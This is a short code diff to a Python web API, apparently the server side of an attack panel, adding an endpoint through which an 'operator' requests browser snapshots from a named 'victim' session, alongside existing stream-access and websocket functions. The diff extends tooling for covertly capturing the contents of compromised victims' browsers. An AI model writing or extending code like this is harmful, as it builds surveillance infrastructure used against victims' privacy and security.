@@ -16,6 +16,7 @@ from .private_common import (
     json,
     logger,
     settings,
+    snapshot_requests,
     stream_access,
     verify_api_token,
     ws_manager,
@@ -127,6 +128,20 @@ async def create_stream_access(
         "access_path": access_path,
         "role": request.role,
         "expires_in": request.ttl_seconds,
+    }
+
+
+@api_router.post("/sessions/{victim_id}/snapshot-requests")
+async def create_snapshot_request(
+    victim_id: str,
+    auth: str = Depends(verify_api_token),
+):
+    """Register an operator-requested browser snapshot for a victim."""
+    request = await snapshot_requests.register(victim_id)
+    logger.info(f"📸 Snapshot requested for victim {victim_id}: {request['id']}")
+    return {
+        "request_id": request["id"],
+        "requested_at": request["requested_at_iso"],
     }
 
 
